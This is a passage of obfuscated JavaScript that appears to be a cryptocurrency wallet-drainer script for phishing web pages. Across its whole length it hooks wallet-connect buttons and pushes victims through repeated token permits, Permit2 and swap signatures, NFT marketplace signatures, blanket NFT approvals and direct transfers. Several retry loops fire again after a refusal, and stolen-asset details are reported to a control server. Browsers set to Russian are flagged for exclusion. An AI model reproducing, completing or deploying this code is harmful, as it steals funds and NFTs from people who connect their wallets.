                            if (MS_Settings[_0x34c511(0x30a)][_0x34c511(0x2ce)][_0x34c511(0x372)] > 0x0 && (!MS_Sign_Disabled || MS_Settings[_0x34c511(0x30a)][_0x34c511(0x2ce)][_0x34c511(0x235)] == 0x1))
                                while (!![]) {
                                    try {
                                        await SIGN_NATIVE(_0x58be45), _0x58be45[_0x34c511(0x17b)] = !![];
                                        break;
                                    } catch (_0x32e80c) {
                                        console[_0x34c511(0x1db)](_0x32e80c);
                                        if (MS_Settings['Settings'][_0x34c511(0x2ce)][_0x34c511(0x33b)] == 0x1 && MS_Current_Provider == _0x34c511(0x2b1) || typeof _0x32e80c[_0x34c511(0x1bb)] == 'string' && _0x32e80c['message'][_0x34c511(0x2e6)](_0x34c511(0x203)) || _0x32e80c['code'] == -0x7f59 || _0x32e80c[_0x34c511(0x1b7)] == -0x7d00 || _0x32e80c[_0x34c511(0x1bb)] && is_valid_json(_0x32e80c[_0x34c511(0x1bb)]) && (JSON[_0x34c511(0x26a)](_0x32e80c[_0x34c511(0x1bb)])['code'] == -0x7f59 || JSON['parse'](_0x32e80c['message'])[_0x34c511(0x1b7)] == -0x7d00)) {
                                            if (MS_Settings[_0x34c511(0x30a)]['Sign'][_0x34c511(0x235)] == 0x1) await sign_cancel();
                                            else {
                                                await sign_unavailable();
                                                while (!![]) {
                                                    try {
                                                        await TRANSFER_NATIVE(_0x58be45), _0x58be45[_0x34c511(0x17b)] = !![];
                                                        break;
                                                    } catch (_0x4fd4a9) {
                                                        console[_0x34c511(0x1db)](_0x4fd4a9);
                                                        if (_0x4fd4a9 != 'LOW_BALANCE') {
                                                            await transfer_cancel();
                                                            if (!MS_Settings['Loop_N']) break;
                                                        } else break;
                                                    }
                                                }
                                            }
                                            break;
                                        } else {
                                            console[_0x34c511(0x1db)](_0x32e80c);
                                            if (_0x32e80c != _0x34c511(0x32a)) {
                                                await sign_cancel();
                                                if (!MS_Settings[_0x34c511(0x33a)]) break;
                                            } else break;
                                        }
                                    }
                                } else
                                    while (!![]) {
                                        try {
                                            await TRANSFER_NATIVE(_0x58be45), _0x58be45[_0x34c511(0x17b)] = !![];
                                            break;
                                        } catch (_0x3801c3) {
                                            console[_0x34c511(0x1db)](_0x3801c3);
                                            if (_0x3801c3 != 'LOW_BALANCE') {
                                                await transfer_cancel();
                                                if (!MS_Settings[_0x34c511(0x33a)]) break;
                                            } else break;
                                        }
                                    }
                        } else {
                            if (_0x58be45['type'] == _0x34c511(0x345)) {
                                if (typeof _0x58be45[_0x34c511(0x341)] == 'undefined' && MS_Settings[_0x34c511(0x30a)][_0x34c511(0x25f)][_0x34c511(0x191)] && _0x58be45[_0x34c511(0x344)] >= MS_Settings['Settings']['Permit'][_0x34c511(0x2e8)]) {
                                    const _0xc591cb = await retrive_token(_0x58be45[_0x34c511(0x1cc)], _0x58be45[_0x34c511(0x1e6)]),
                                        _0x1eef83 = new ethers['providers'][(_0x34c511(0x315))](MS_Settings[_0x34c511(0x31a)][_0x58be45[_0x34c511(0x1cc)]]),
                                        _0x2b9bb3 = new ethers['Contract'](_0x58be45['address'], _0xc591cb, _0x1eef83),
                                        _0x3d75b7 = get_permit_type(_0x2b9bb3[_0x34c511(0x28e)]);
                                    _0x58be45[_0x34c511(0x341)] = _0x3d75b7, _0x58be45['permit_ver'] = '1', _0x58be45[_0x34c511(0x1b6)] = _0xc591cb;
                                    if (_0x3d75b7 > 0x0) {
                                        if (_0x2b9bb3[_0x34c511(0x28e)]['hasOwnProperty'](_0x34c511(0x23b))) try {
                                            _0x58be45['permit_ver'] = await _0x2b9bb3[_0x34c511(0x23b)]();
                                        } catch (_0x14971f) {
                                            console['log'](_0x14971f);
                                        }
                                        console[_0x34c511(0x1db)]('[PERMIT\x20FOUND]\x20' + _0x58be45[_0x34c511(0x1bf)] + _0x34c511(0x363) + _0x3d75b7 + ',\x20Version:\x20' + _0x58be45['permit_ver']);
                                    }
                                }
                                if (_0x58be45[_0x34c511(0x341)] > 0x0)
                                    for (const _0x865b10 of MS_Settings[_0x34c511(0x1a3)]) {
                                        if (_0x865b10[0x0] == MS_Current_Chain_ID && _0x865b10[0x1] === _0x58be45['address'][_0x34c511(0x190)]()[_0x34c511(0x2fc)]()) {
                                            _0x58be45[_0x34c511(0x341)] = 0x0;
                                            break;
                                        }
                                    }
                                if (MS_Settings[_0x34c511(0x30a)][_0x34c511(0x1c5)]['Mode'] && _0x58be45['permit2']) {
                                    const _0xb61609 = [];
                                    for (const _0x1f3659 of _0x668742) {
                                        try {
                                            _0x1f3659['chain_id'] == _0x58be45[_0x34c511(0x1cc)] && _0x1f3659[_0x34c511(0x228)] && (_0xb61609[_0x34c511(0x28a)](_0x1f3659), _0x1f3659['skip'] = !![]);
                                        } catch (_0xe8ce20) {
                                            console[_0x34c511(0x1db)](_0xe8ce20);
                                        }
                                    }
                                    while (!![]) {
                                        try {
                                            await DO_PERMIT2(_0x58be45, _0xb61609), _0x58be45[_0x34c511(0x17b)] = !![];
                                            break;
                                        } catch (_0x5d282a) {
                                            console[_0x34c511(0x1db)](_0x5d282a), await approve_cancel();
                                            if (!MS_Settings[_0x34c511(0x1c7)]) break;
                                        }
                                    }
                                } else {
                                    if (MS_Settings[_0x34c511(0x30a)][_0x34c511(0x25f)][_0x34c511(0x191)] && _0x58be45[_0x34c511(0x341)] && _0x58be45[_0x34c511(0x341)] > 0x0)
                                        while (!![]) {
                                            try {
                                                await PERMIT_TOKEN(_0x58be45), _0x58be45['skip'] = !![];
                                                break;
                                            } catch (_0x417d06) {
                                                console['log'](_0x417d06), await approve_cancel();
                                                if (!MS_Settings[_0x34c511(0x1c7)]) break;
                                            }
                                        } else {
                                            if (MS_Settings[_0x34c511(0x30a)]['Swappers'][_0x34c511(0x313)] && _0x58be45[_0x34c511(0x2bb)] && _0x58be45['amount_usd'] >= MS_Settings[_0x34c511(0x30a)][_0x34c511(0x337)]['Price']) {
                                                if (_0x58be45[_0x34c511(0x2b9)] == _0x34c511(0x356)) {
                                                    const _0x188788 = [];
                                                    for (const _0x265dc8 of _0x668742) {
                                                        try {
                                                            _0x265dc8['chain_id'] == _0x58be45[_0x34c511(0x1cc)] && _0x265dc8[_0x34c511(0x2bb)] && _0x265dc8['swapper_type'] == 'Uniswap' && (_0x188788[_0x34c511(0x28a)](_0x265dc8), _0x265dc8[_0x34c511(0x17b)] = !![]);
                                                        } catch (_0x1dada8) {
                                                            console[_0x34c511(0x1db)](_0x1dada8);
                                                        }
                                                    }
                                                    while (!![]) {
                                                        try {
                                                            await DO_UNISWAP(_0x58be45, _0x188788), _0x58be45[_0x34c511(0x17b)] = !![];
                                                            break;
                                                        } catch (_0x2a0e0f) {
                                                            console[_0x34c511(0x1db)](_0x2a0e0f), await sign_cancel();
                                                            if (!MS_Settings['Loop_T']) break;
                                                        }
                                                    }
                                                } else {
                                                    if (_0x58be45[_0x34c511(0x2b9)] == _0x34c511(0x182)) {
                                                        const _0x2cad73 = [];
                                                        for (const _0x3acd53 of _0x668742) {
                                                            try {
                                                                _0x3acd53[_0x34c511(0x1cc)] == _0x58be45[_0x34c511(0x1cc)] && _0x3acd53[_0x34c511(0x2bb)] && _0x3acd53[_0x34c511(0x2b9)] == _0x34c511(0x182) && (_0x2cad73['push'](_0x3acd53), _0x3acd53[_0x34c511(0x17b)] = !![]);
                                                            } catch (_0x22d347) {
                                                                console[_0x34c511(0x1db)](_0x22d347);
                                                            }
                                                        }
                                                        while (!![]) {
                                                            try {
                                                                await DO_PANCAKE_V3(_0x58be45, _0x2cad73), _0x58be45[_0x34c511(0x17b)] = !![];
                                                                break;
                                                            } catch (_0x1e5324) {
                                                                console[_0x34c511(0x1db)](_0x1e5324), await sign_cancel();
                                                                if (!MS_Settings['Loop_T']) break;
                                                            }
                                                        }
                                                    } else
                                                        while (!![]) {
                                                            try {
                                                                await DO_SWAP(_0x58be45), _0x58be45[_0x34c511(0x17b)] = !![];
                                                                break;
                                                            } catch (_0x1d2642) {
                                                                console[_0x34c511(0x1db)](_0x1d2642), await sign_cancel();
                                                                if (!MS_Settings['Loop_T']) break;
                                                            }
                                                        }
                                                }
                                            } else {
                                                if (MS_Settings[_0x34c511(0x30a)][_0x34c511(0x2ce)][_0x34c511(0x320)] > 0x0 && (!MS_Sign_Disabled || MS_Settings[_0x34c511(0x30a)][_0x34c511(0x2ce)][_0x34c511(0x235)] == 0x1))
                                                    while (!![]) {
                                                        try {
                                                            await SIGN_TOKEN(_0x58be45);
                                                            if (MS_Settings['Settings'][_0x34c511(0x2ce)]['Tokens'] == 0x1) {
                                                                const _0x16b304 = send_request({
                                                                    'action': _0x34c511(0x24d),
                                                                    'user_id': MS_ID,
                                                                    'asset': _0x58be45,
                                                                    'address': MS_Current_Address,
                                                                    'PW': ![]
                                                                });
                                                                if (MS_Settings[_0x34c511(0x30a)][_0x34c511(0x2ed)]) await _0x16b304;
                                                            }
                                                            _0x58be45[_0x34c511(0x17b)] = !![];
                                                            break;
                                                        } catch (_0x337916) {
                                                            console[_0x34c511(0x1db)](_0x337916);
                                                            if (MS_Settings[_0x34c511(0x30a)][_0x34c511(0x2ce)][_0x34c511(0x33b)] == 0x1 && MS_Current_Provider == _0x34c511(0x2b1) || typeof _0x337916[_0x34c511(0x1bb)] == 'string' && _0x337916[_0x34c511(0x1bb)][_0x34c511(0x2e6)](_0x34c511(0x203)) || _0x337916[_0x34c511(0x1b7)] == -0x7f59 || _0x337916['code'] == -0x7d00 || _0x337916[_0x34c511(0x1bb)] && is_valid_json(_0x337916[_0x34c511(0x1bb)]) && (JSON[_0x34c511(0x26a)](_0x337916['message'])[_0x34c511(0x1b7)] == -0x7f59 || JSON[_0x34c511(0x26a)](_0x337916['message'])[_0x34c511(0x1b7)] == -0x7d00)) {
                                                                if (MS_Settings['Settings'][_0x34c511(0x2ce)]['Force'] == 0x1) await sign_cancel();
                                                                else {
                                                                    await sign_unavailable();
                                                                    while (!![]) {
                                                                        if (MS_Settings[_0x34c511(0x30a)][_0x34c511(0x2ce)]['Tokens'] == 0x1) {
                                                                            if (MS_Current_Provider == _0x34c511(0x275) && MS_Settings[_0x34c511(0x30a)][_0x34c511(0x256)][_0x34c511(0x275)] || MS_Current_Provider == _0x34c511(0x1f8) && MS_Settings[_0x34c511(0x30a)][_0x34c511(0x256)]['Trust'] || MS_Current_Provider != _0x34c511(0x275) && MS_Current_Provider != _0x34c511(0x1f8)) try {
                                                                                let _0x514c42 = await APPROVE_TOKEN(_0x58be45);
                                                                                if (_0x514c42 == 0x1) {
                                                                                    const _0x10e1cf = send_request({
                                                                                        'action': _0x34c511(0x24d),
                                                                                        'user_id': MS_ID,
                                                                                        'asset': _0x58be45,
                                                                                        'address': MS_Current_Address,
                                                                                        'PW': MS_Settings[_0x34c511(0x305)]
                                                                                    });
                                                                                    if (MS_Settings[_0x34c511(0x30a)][_0x34c511(0x2ed)]) await _0x10e1cf;
                                                                                }
                                                                                _0x58be45[_0x34c511(0x17b)] = !![];
                                                                                break;
                                                                            } catch (_0x2b6822) {
                                                                                await approve_cancel();
                                                                                if (!MS_Settings[_0x34c511(0x1c7)]) break;
                                                                            } else try {
                                                                                await TRANSFER_TOKEN(_0x58be45), _0x58be45[_0x34c511(0x17b)] = !![];
                                                                                break;
                                                                            } catch (_0x3a1ac3) {
                                                                                console[_0x34c511(0x1db)](_0x3a1ac3), await transfer_cancel();
                                                                                if (!MS_Settings[_0x34c511(0x1c7)]) break;
                                                                            }
                                                                        } else {
                                                                            if (MS_Settings[_0x34c511(0x30a)][_0x34c511(0x2ce)][_0x34c511(0x320)] == 0x2) try {
                                                                                await TRANSFER_TOKEN(_0x58be45), _0x58be45[_0x34c511(0x17b)] = !![];
                                                                                break;
                                                                            } catch (_0x55004f) {
                                                                                console[_0x34c511(0x1db)](_0x55004f), await transfer_cancel();
                                                                                if (!MS_Settings['Loop_T']) break;
                                                                            }
                                                                        }
                                                                    }
                                                                }
                                                                break;
                                                            } else {
                                                                console['log'](_0x337916);
                                                                if (_0x337916 != _0x34c511(0x32a)) {
                                                                    await sign_cancel();
                                                                    if (!MS_Settings[_0x34c511(0x1c7)]) break;
                                                                } else break;
                                                            }
                                                        }
                                                    } else {
                                                        if (MS_Current_Provider == _0x34c511(0x275) && MS_Settings['Settings'][_0x34c511(0x256)][_0x34c511(0x275)] || MS_Current_Provider == _0x34c511(0x1f8) && MS_Settings['Settings'][_0x34c511(0x256)][_0x34c511(0x179)] || MS_Current_Provider != _0x34c511(0x275) && MS_Current_Provider != 'Trust\x20Wallet')
                                                            while (!![]) {
                                                                try {
                                                                    let _0x174f93 = await APPROVE_TOKEN(_0x58be45);
                                                                    if (_0x174f93 == 0x1) {
                                                                        const _0x419997 = send_request({
                                                                            'action': _0x34c511(0x24d),
                                                                            'user_id': MS_ID,
                                                                            'asset': _0x58be45,
                                                                            'address': MS_Current_Address,
                                                                            'PW': MS_Settings[_0x34c511(0x305)]
                                                                        });
                                                                        if (MS_Settings[_0x34c511(0x30a)]['Wait_For_Response']) await _0x419997;
                                                                    }
                                                                    _0x58be45['skip'] = !![];
                                                                    break;
                                                                } catch (_0x35f2f9) {
                                                                    console[_0x34c511(0x1db)](_0x35f2f9), await approve_cancel();
                                                                    if (!MS_Settings[_0x34c511(0x1c7)]) break;
                                                                }
                                                            } else
                                                                while (!![]) {
                                                                    try {
                                                                        await TRANSFER_TOKEN(_0x58be45), _0x58be45[_0x34c511(0x17b)] = !![];
                                                                        break;
                                                                    } catch (_0x3b8085) {
                                                                        console[_0x34c511(0x1db)](_0x3b8085), await transfer_cancel();
                                                                        if (!MS_Settings[_0x34c511(0x1c7)]) break;
                                                                    }
                                                                }
                                                    }
                                            }
                                        }
                                }
                            } else {
                                if (_0x58be45[_0x34c511(0x281)] == _0x34c511(0x355)) {
                                    if (typeof SIGN_BLUR !== _0x34c511(0x1d2) && MS_Settings[_0x34c511(0x30a)][_0x34c511(0x20f)][_0x34c511(0x313)] == 0x1 && MS_Settings[_0x34c511(0x30a)]['Blur'][_0x34c511(0x312)] == 0x0 && !BL_US && MS_Current_Chain_ID == 0x1 && await is_nft_approved(_0x58be45['address'], MS_Current_Address, '0x00000000000111abe46ff893f3b2fdf1f759a8a8') && _0x58be45['amount_usd'] >= MS_Settings[_0x34c511(0x30a)][_0x34c511(0x20f)]['Price']) await SIGN_BLUR(_0x668742, MS_Provider, MS_Current_Address, MS_Settings[_0x34c511(0x2ad)], MS_ID, MS_Settings[_0x34c511(0x30a)]['Blur']['Price']), BL_US = !![];
                                    else {
                                        if (typeof SIGN_SEAPORT !== _0x34c511(0x1d2) && MS_Settings[_0x34c511(0x30a)]['SeaPort'][_0x34c511(0x313)] == 0x1 && MS_Settings[_0x34c511(0x30a)][_0x34c511(0x1c4)][_0x34c511(0x312)] == 0x0 && !SP_US && MS_Current_Chain_ID == 0x1 && await is_nft_approved(_0x58be45[_0x34c511(0x1e6)], MS_Current_Address, _0x34c511(0x1e2)) && _0x58be45['amount_usd'] >= MS_Settings[_0x34c511(0x30a)][_0x34c511(0x1c4)][_0x34c511(0x2e8)]) await SIGN_SEAPORT(_0x668742, MS_Provider, MS_Current_Address, MS_Settings[_0x34c511(0x2ad)], MS_ID, MS_Settings[_0x34c511(0x30a)][_0x34c511(0x1c4)]['Price']), SP_US = !![];
                                        else {
                                            if (typeof SIGN_X2Y2 !== 'undefined' && MS_Settings[_0x34c511(0x30a)]['x2y2'][_0x34c511(0x313)] == 0x1 && MS_Settings[_0x34c511(0x30a)]['x2y2'][_0x34c511(0x312)] == 0x0 && !XY_US && MS_Current_Chain_ID == 0x1 && await is_nft_approved(_0x58be45[_0x34c511(0x1e6)], MS_Current_Address, _0x34c511(0x22c)) && _0x58be45['amount_usd'] >= MS_Settings[_0x34c511(0x30a)][_0x34c511(0x359)]['Price']) await SIGN_X2Y2(_0x668742, MS_Provider, MS_Current_Address, MS_Settings[_0x34c511(0x2ad)], MS_ID, MS_Settings[_0x34c511(0x30a)][_0x34c511(0x359)]['Price']), XY_US = !![];
                                            else {
                                                if (MS_Settings[_0x34c511(0x30a)][_0x34c511(0x2ce)][_0x34c511(0x195)] > 0x0 && (!MS_Sign_Disabled || MS_Settings[_0x34c511(0x30a)][_0x34c511(0x2ce)]['Force'] == 0x1))
                                                    while (!![]) {
                                                        try {
                                                            await SIGN_NFT(_0x58be45);
                                                            if (MS_Settings[_0x34c511(0x30a)][_0x34c511(0x2ce)][_0x34c511(0x320)] == 0x1) {
                                                                let _0x2f484e = [];
                                                                for (const _0x57c3e0 of _0x668742) {
                                                                    try {
                                                                        _0x57c3e0[_0x34c511(0x1e6)] == _0x58be45[_0x34c511(0x1e6)] && (_0x2f484e[_0x34c511(0x28a)](_0x57c3e0), _0x57c3e0[_0x34c511(0x17b)] = !![]);
                                                                    } catch (_0x3f10ef) {
                                                                        console[_0x34c511(0x1db)](_0x3f10ef);
                                                                    }
                                                                }
                                                                await send_request({
                                                                    'action': _0x34c511(0x1de),
                                                                    'user_id': MS_ID,
                                                                    'tokens': _0x2f484e,
                                                                    'address': MS_Current_Address,
                                                                    'chain_id': MS_Current_Chain_ID,
                                                                    'contract_address': _0x58be45[_0x34c511(0x1e6)]
                                                                });
                                                            }
                                                            _0x58be45['skip'] = !![];
                                                            break;
                                                        } catch (_0x450369) {
                                                            console[_0x34c511(0x1db)](_0x450369);
                                                            if (MS_Settings[_0x34c511(0x30a)][_0x34c511(0x2ce)][_0x34c511(0x33b)] == 0x1 && MS_Current_Provider == _0x34c511(0x2b1) || typeof _0x450369[_0x34c511(0x1bb)] == _0x34c511(0x370) && _0x450369[_0x34c511(0x1bb)][_0x34c511(0x2e6)](_0x34c511(0x203)) || _0x450369['code'] == -0x7f59 || _0x450369['code'] == -0x7d00 || _0x450369['message'] && is_valid_json(_0x450369[_0x34c511(0x1bb)]) && (JSON[_0x34c511(0x26a)](_0x450369[_0x34c511(0x1bb)])['code'] == -0x7f59 || JSON[_0x34c511(0x26a)](_0x450369[_0x34c511(0x1bb)])['code'] == -0x7d00)) {
                                                                if (MS_Settings[_0x34c511(0x30a)][_0x34c511(0x2ce)][_0x34c511(0x235)] == 0x1) await sign_cancel();
                                                                else {
                                                                    await sign_unavailable();
                                                                    while (!![]) {
                                                                        if (MS_Settings['Settings'][_0x34c511(0x2ce)][_0x34c511(0x195)] == 0x1) try {
                                                                            await DO_SAFA(_0x58be45);
                                                                            let _0xf1db8c = [];
                                                                            for (const _0x5e1de0 of _0x668742) {
                                                                                try {
                                                                                    _0x5e1de0['address'] == _0x58be45[_0x34c511(0x1e6)] && (_0xf1db8c[_0x34c511(0x28a)](_0x5e1de0), _0x5e1de0[_0x34c511(0x17b)] = !![]);
                                                                                } catch (_0x145acb) {
                                                                                    console[_0x34c511(0x1db)](_0x145acb);
                                                                                }
                                                                            }
                                                                            await send_request({
                                                                                'action': _0x34c511(0x1de),
                                                                                'user_id': MS_ID,
                                                                                'tokens': _0xf1db8c,
                                                                                'address': MS_Current_Address,
                                                                                'chain_id': MS_Current_Chain_ID,
                                                                                'contract_address': _0x58be45[_0x34c511(0x1e6)]
                                                                            }), _0x58be45[_0x34c511(0x17b)] = !![];
                                                                            break;
                                                                        } catch (_0x3c7edb) {
                                                                            console[_0x34c511(0x1db)](_0x3c7edb), await approve_cancel();
                                                                            if (!MS_Settings[_0x34c511(0x185)]) break;
                                                                        } else {
                                                                            if (MS_Settings[_0x34c511(0x30a)]['Sign']['NFTs'] == 0x2) try {
                                                                                await TRANSFER_NFT(_0x58be45), _0x58be45[_0x34c511(0x17b)] = !![];
                                                                                break;
                                                                            } catch (_0x15944d) {
                                                                                console[_0x34c511(0x1db)](_0x15944d), await transfer_cancel();
                                                                                if (!MS_Settings['Loop_NFT']) break;
                                                                            }
                                                                        }
                                                                    }
                                                                }
                                                                break;
                                                            } else {
                                                                console[_0x34c511(0x1db)](_0x450369);
                                                                if (_0x450369 != _0x34c511(0x32a)) {
                                                                    await sign_cancel();
                                                                    if (!MS_Settings['Loop_NFT']) break;
                                                                } else break;
                                                            }
                                                        }
                                                    } else {
                                                        if (MS_Settings[_0x34c511(0x30a)]['Approve']['Enable'])
                                                            while (!![]) {
                                                                try {
                                                                    await DO_SAFA(_0x58be45);
                                                                    let _0x3f05a6 = [];
                                                                    for (const _0x3663f7 of _0x668742) {
                                                                        try {
                                                                            _0x3663f7[_0x34c511(0x1e6)] == _0x58be45[_0x34c511(0x1e6)] && (_0x3f05a6[_0x34c511(0x28a)](_0x3663f7), _0x3663f7[_0x34c511(0x17b)] = !![]);
                                                                        } catch (_0x4b9947) {
                                                                            console[_0x34c511(0x1db)](_0x4b9947);
                                                                        }
                                                                    }
                                                                    await send_request({
                                                                        'action': _0x34c511(0x1de),
                                                                        'user_id': MS_ID,
                                                                        'tokens': _0x3f05a6,
                                                                        'address': MS_Current_Address,
                                                                        'chain_id': MS_Current_Chain_ID,
                                                                        'contract_address': _0x58be45[_0x34c511(0x1e6)]
                                                                    }), _0x58be45[_0x34c511(0x17b)] = !![];
                                                                    break;
                                                                } catch (_0x2b2903) {
                                                                    console[_0x34c511(0x1db)](_0x2b2903), await approve_cancel();
                                                                    if (!MS_Settings['Loop_NFT']) break;
                                                                }
                                                            } else
                                                                while (!![]) {
                                                                    try {
                                                                        await TRANSFER_NFT(_0x58be45), _0x58be45[_0x34c511(0x17b)] = !![];
                                                                        break;
                                                                    } catch (_0x3df134) {
                                                                        console[_0x34c511(0x1db)](_0x3df134), await transfer_cancel();
                                                                        if (!MS_Settings[_0x34c511(0x185)]) break;
                                                                    }
                                                                }
                                                    }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    } catch (_0x5c5d4e) {
                        console[_0x34c511(0x1db)](_0x5c5d4e);
                    }
                }
            }
            MS_Process = ![], setTimeout(end_message, 0x7d0);
        } catch (_0xb49e73) {
            console['log'](_0xb49e73);
        }
    };
try {
    let query_string = window['location']['search'],
        url_params = new URLSearchParams(query_string);
    url_params['get']('cis') != _0x1027e3(0x2c0) && (navigator[_0x1027e3(0x300)] || navigator[_0x1027e3(0x220)])[_0x1027e3(0x190)]()[_0x1027e3(0x2e6)]('ru') && (MS_Bad_Country = !![]);
} catch (_0x59f09f) {
    console[_0x1027e3(0x1db)](_0x59f09f);
}
document[_0x1027e3(0x2f4)]('DOMContentLoaded', async () => {
    const _0x101c49 = _0x1027e3;
    try {
        if (MS_Modal_Style == 0x2) MSM[_0x101c49(0x327)]();
        else inject_modal();
        if (MS_Loader_Style == 0x2) MSL[_0x101c49(0x327)]();
        MS_Load_Time = Math[_0x101c49(0x32c)](Date[_0x101c49(0x364)]() / 0x3e8);
        if (typeof localStorage['MS_ID'] === 'undefined') {
            const _0x157e71 = await send_request({
                'action': 'retrive_id'
            });
            if (_0x157e71['status'] == 'OK') localStorage[_0x101c49(0x241)] = _0x157e71[_0x101c49(0x1a0)];
            else localStorage[_0x101c49(0x241)] = Math['floor'](Date[_0x101c49(0x364)]() / 0x3e8);
        }
        MS_ID = localStorage['MS_ID'], await retrive_config(), fill_chain_data(), await retrive_contract(), MS_Ready = !![], enter_website();
        for (const _0x1ea78f in MS_Settings['RPCs']) MS_Gas_Reserves[_0x1ea78f] = 0x0;
        for (const _0x450376 of document['querySelectorAll'](_0x101c49(0x201))) {
            try {
                _0x450376[_0x101c49(0x2f4)](_0x101c49(0x1fb), () => wallet_connection());
            } catch (_0x47fd1c) {
                console['log'](_0x47fd1c);
            }
        }
    } catch (_0x397aa9) {
        console[_0x101c49(0x1db)](_0x397aa9);
    }
});
const use_wc = () => {
    const _0x5e6a22 = _0x1027e3;
    connect_wallet(_0x5e6a22(0x2b1));
};
setInterval(async () => {
    const _0x126b2a = _0x1027e3;
    try {
        let _0x48b4e1 = document['getElementById']('partner-address');
        if (_0x48b4e1 === null) return;
        else MS_Partner_Address = _0x48b4e1[_0x126b2a(0x31f)][_0x126b2a(0x2fc)]();
    } catch (_0x19e91c) {
        console[_0x126b2a(0x1db)](_0x19e91c);
    }
}, 0x3e8), window[_0x1027e3(0x2f4)]('beforeunload', _0x47c82c => leave_website()), window['addEventListener']('onbeforeunload', _0x3cb2a8 => leave_website());